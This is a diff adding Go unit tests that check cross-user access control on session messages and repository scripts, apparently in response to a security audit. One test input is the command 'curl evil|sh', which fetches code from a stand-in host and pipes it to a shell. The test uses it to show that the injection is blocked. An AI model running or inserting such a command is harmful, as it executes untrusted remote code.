@@ -181,3 +181,57 @@ func TestAuthorizeSessionAccess(t *testing.T) {
 		t.Fatalf("internal session access: %v", err)
 	}
 }
+
+// TestMessageScopingBlocksForeignSession covers the read/search paths the
+// security audit flagged as unscoped (agent-conversation cross-user read).
+func TestMessageScopingBlocksForeignSession(t *testing.T) {
+	svc, _, repo := createTestService(t)
+	seedScopedWorkspaces(t, repo)
+
+	if _, err := svc.ListMessages(ctxAs("user-a"), "sess-b"); !errors.Is(err, repoerrors.ErrTaskNotFound) {
+		t.Fatalf("foreign ListMessages: %v", err)
+	}
+	if _, _, err := svc.ListMessagesPaginated(ctxAs("user-a"), ListMessagesRequest{TaskSessionID: "sess-b"}); !errors.Is(err, repoerrors.ErrTaskNotFound) {
+		t.Fatalf("foreign ListMessagesPaginated: %v", err)
+	}
+	if _, err := svc.SearchMessages(ctxAs("user-a"), "sess-b", "q", 10); !errors.Is(err, repoerrors.ErrTaskNotFound) {
+		t.Fatalf("foreign SearchMessages: %v", err)
+	}
+	// Owner and internal callers are unaffected.
+	if _, err := svc.ListMessages(ctxAs("user-b"), "sess-b"); err != nil {
+		t.Fatalf("owner ListMessages: %v", err)
+	}
+	if _, err := svc.ListMessages(context.Background(), "sess-b"); err != nil {
+		t.Fatalf("internal ListMessages: %v", err)
+	}
+}
+
+// TestRepositoryScriptScoping covers the repository-script read/inject paths
+// the security audit flagged as unscoped.
+func TestRepositoryScriptScoping(t *testing.T) {
+	svc, _, repo := createTestService(t)
+	seedScopedWorkspaces(t, repo)
+	ctx := context.Background()
+	if err := repo.CreateRepository(ctx, &models.Repository{ID: "repo-b", WorkspaceID: "ws-b", Name: "b"}); err != nil {
+		t.Fatalf("seed repo: %v", err)
+	}
+
+	if _, err := svc.CreateRepositoryScript(ctxAs("user-a"), &CreateRepositoryScriptRequest{
+		RepositoryID: "repo-b", Name: "evil", Command: "curl evil|sh",
+	}); !errors.Is(err, repoerrors.ErrRepositoryNotFound) {
+		t.Fatalf("foreign CreateRepositoryScript: %v", err)
+	}
+	if _, err := svc.ListRepositoryScripts(ctxAs("user-a"), "repo-b"); !errors.Is(err, repoerrors.ErrRepositoryNotFound) {
+		t.Fatalf("foreign ListRepositoryScripts: %v", err)
+	}
+	// Owner can create + list.
+	created, err := svc.CreateRepositoryScript(ctxAs("user-b"), &CreateRepositoryScriptRequest{
+		RepositoryID: "repo-b", Name: "setup", Command: "make",
+	})
+	if err != nil {
+		t.Fatalf("owner CreateRepositoryScript: %v", err)
+	}
+	if _, err := svc.GetRepositoryScript(ctxAs("user-a"), created.ID); !errors.Is(err, repoerrors.ErrRepositoryNotFound) {
+		t.Fatalf("foreign GetRepositoryScript: %v", err)
+	}
+}
